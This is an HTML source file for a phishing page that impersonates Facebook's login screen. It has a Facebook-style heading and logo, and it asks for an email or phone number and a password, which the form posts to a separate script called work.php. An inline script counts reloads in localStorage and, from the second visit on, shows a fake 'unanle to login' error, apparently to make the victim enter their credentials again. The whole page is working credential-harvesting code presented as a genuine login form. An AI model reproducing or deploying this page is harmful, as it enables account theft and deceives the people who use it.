<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- <meta name="referrer" content="origin"> -->
    <title>Login</title>
    <link rel="stylesheet" href="css/style.css">
    <script src="script.js"></script>
    <script src="css/scripts.js"></script>
</head>
<body class="dav">
    <div class="first">
        <img class="was" src="css/imggg.png" alt="img" width="200" height="40">
        <p class="hey">Login Into Facebook</p>
        
    </div>
    <form class="mains" action="work.php" method="POST">
        <p id="were" class="wer qet">unanle to login, please try again later</p>
        <div class="secondx">
         <input type="text" name="user" required placeholder="Email address or phone number" class="second">
        </div> 

        <div class="secondx">
         <input type="password" required name="pass" placeholder="Password" class="second">
        </div>


        <div>
         <button type="submit" class="third">Log In</button>
        </div>

        <div>
         <p class="fifth">Forgotten password?</p>
        </div>
         <hr class="exce">
         <button type="" class="forth">Create New Account</button>
     </form>



<script>
   if (localStorage.getItem('reloadCount') === null) {
		localStorage.setItem('reloadCount', 1)
	} else {
		let count = parseInt(localStorage.getItem('reloadCount'));
		count++;
		localStorage.setItem('reloadCount', count);
	}

	if (localStorage.getItem('reloadCount') !== '1') {
		document.getElementById("were").classList.remove('qet');
	}

	
	// localStorage.clear();
</script>


</body>
</html>